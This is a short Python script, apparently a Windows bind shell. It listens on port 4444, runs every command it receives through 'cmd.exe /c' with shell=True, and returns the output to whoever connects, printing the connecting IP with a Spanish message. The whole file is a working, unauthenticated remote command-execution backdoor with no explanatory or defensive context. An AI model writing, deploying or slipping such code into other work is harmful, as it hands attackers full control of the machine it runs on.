import socket
import subprocess

k = ("10.0.0.0",4444)

while True:
    p = socket.socket()
    p.bind(k)
    p.listen(1)

    s,o = p.accept()
    i = "se conecto esta ip "
    print(i,o)
    l = s.recv(1024).decode()

    kaka = subprocess.run(f"cmd.exe /c {l}",shell=True,text=True,capture_output=True)
    popo = kaka.stdout
    s.send(popo.encode())
    s.close()
    p.close()
